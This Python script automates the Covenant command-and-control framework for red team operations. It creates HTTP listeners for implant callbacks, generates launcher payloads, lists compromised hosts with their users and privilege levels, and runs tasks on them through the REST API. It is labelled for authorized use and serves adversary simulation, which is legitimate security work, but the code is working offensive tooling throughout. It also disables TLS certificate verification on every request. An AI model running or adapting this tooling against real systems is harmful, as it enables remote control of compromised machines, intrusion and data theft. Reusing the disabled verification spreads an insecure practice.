#!/usr/bin/env python3
"""Agent for red team operations with Covenant C2 framework.

Automates Covenant C2 operations through its REST API: listener
management, launcher generation, grunt monitoring, and task
execution for authorized adversary simulation engagements.
"""
# For authorized red team engagements only

import argparse
import json
import os
from datetime import datetime
from pathlib import Path

try:
    import requests
except ImportError:
    requests = None


class CovenantC2Agent:
    """Manages Covenant C2 operations via its REST API."""

    def __init__(self, covenant_url, username, password,
                 output_dir="./covenant_ops"):
        self.base_url = covenant_url.rstrip("/")
        self.token = None
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.operations_log = []
        self._authenticate(username, password)

    def _authenticate(self, username, password):
        """Authenticate and obtain JWT token from Covenant API."""
        if not requests:
            return
        try:
            resp = requests.post(
                f"{self.base_url}/api/users/login",
                json={"userName": username, "password": password},
                verify=False, timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                self.token = data.get("covenantToken") or data.get("token")
                self._log("authenticate", "success", {"user": username})
        except requests.RequestException as e:
            self._log("authenticate", "failed", {"error": str(e)})

    def _api(self, method, path, data=None):
        if not requests or not self.token:
            return None
        try:
            resp = requests.request(
                method, f"{self.base_url}/api{path}",
                headers={"Authorization": f"Bearer {self.token}",
                          "Content-Type": "application/json"},
                json=data, verify=False, timeout=15,
            )
            return resp
        except requests.RequestException:
            return None

    def _log(self, action, status, details=None):
        self.operations_log.append({
            "timestamp": datetime.utcnow().isoformat(),
            "action": action, "status": status,
            "details": details or {},
        })

    def list_listeners(self):
        """List all configured listeners."""
        resp = self._api("GET", "/listeners")
        if resp and resp.status_code == 200:
            listeners = resp.json()
            self._log("list_listeners", "success", {"count": len(listeners)})
            return [{"id": l["id"], "name": l["name"], "status": l["status"],
                     "bindAddress": l.get("bindAddress"),
                     "bindPort": l.get("bindPort"),
                     "listenerType": l.get("listenerType", {}).get("name")}
                    for l in listeners]
        return []

    def create_http_listener(self, name, bind_port=80, connect_addresses=None):
        """Create an HTTP listener for grunt callbacks."""
        listener_data = {
            "name": name,
            "bindAddress": "0.0.0.0",
            "bindPort": bind_port,
            "connectAddresses": connect_addresses or ["0.0.0.0"],
            "listenerTypeId": 1,
            "status": "Active",
        }
        resp = self._api("POST", "/listeners/http", listener_data)
        if resp and resp.status_code in (200, 201):
            result = resp.json()
            self._log("create_listener", "success",
                      {"name": name, "port": bind_port, "id": result.get("id")})
            return result
        self._log("create_listener", "failed",
                  {"status": resp.status_code if resp else 0})
        return None

    def list_grunts(self):
        """List all active grunts (agents)."""
        resp = self._api("GET", "/grunts")
        if resp and resp.status_code == 200:
            grunts = resp.json()
            self._log("list_grunts", "success", {"count": len(grunts)})
            return [{"id": g["id"], "name": g["name"], "status": g["status"],
                     "hostname": g.get("hostname"), "userName": g.get("userName"),
                     "ipAddress": g.get("ipAddress"),
                     "operatingSystem": g.get("operatingSystem"),
                     "integrity": g.get("integrity"),
                     "lastCheckIn": g.get("lastCheckIn")}
                    for g in grunts]
        return []

    def create_launcher(self, listener_id, launcher_type="Binary"):
        """Generate a launcher payload for grunt deployment."""
        resp = self._api("PUT", f"/launchers/{launcher_type.lower()}",
                         {"listenerId": listener_id})
        if resp and resp.status_code == 200:
            launcher = resp.json()
            self._log("create_launcher", "success",
                      {"type": launcher_type, "listener_id": listener_id})
            return {"type": launcher_type, "launcherString": launcher.get("launcherString", "")[:200]}
        return None

    def execute_task(self, grunt_id, task_name, parameters=None):
        """Assign and execute a task on a grunt."""
        task_data = {
            "gruntId": grunt_id,
            "taskName": task_name,
            "parameters": parameters or [],
        }
        resp = self._api("POST", f"/grunts/{grunt_id}/interact", task_data)
        if resp and resp.status_code in (200, 201):
            result = resp.json()
            self._log("execute_task", "success",
                      {"grunt_id": grunt_id, "task": task_name})
            return {"taskId": result.get("id"), "output": result.get("gruntTaskOutput", "")}
        self._log("execute_task", "failed",
                  {"grunt_id": grunt_id, "task": task_name})
        return None

    def get_task_output(self, task_id):
        """Retrieve output from a completed task."""
        resp = self._api("GET", f"/grunttasks/{task_id}")
        if resp and resp.status_code == 200:
            return resp.json().get("gruntTaskOutput", "")
        return None

    def generate_report(self):
        """Generate an operations report for engagement documentation."""
        listeners = self.list_listeners()
        grunts = self.list_grunts()

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "covenant_url": self.base_url,
            "active_listeners": listeners,
            "active_grunts": grunts,
            "operations_log": self.operations_log,
            "total_operations": len(self.operations_log),
        }
        out = self.output_dir / "covenant_ops_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    parser = argparse.ArgumentParser(
        description="Covenant C2 red team operations agent (authorized use only)"
    )
    parser.add_argument("covenant_url", help="Covenant server URL (e.g. https://10.0.0.5:7443)")
    parser.add_argument("--username", default="admin", help="Covenant username")
    parser.add_argument("--password", required=True, help="Covenant password")
    parser.add_argument("--output-dir", default="./covenant_ops",
                        help="Output directory for ops report")
    args = parser.parse_args()

    os.makedirs(args.output_dir, exist_ok=True)
    agent = CovenantC2Agent(args.covenant_url, args.username, args.password,
                            output_dir=args.output_dir)
    agent.generate_report()


if __name__ == "__main__":
    main()
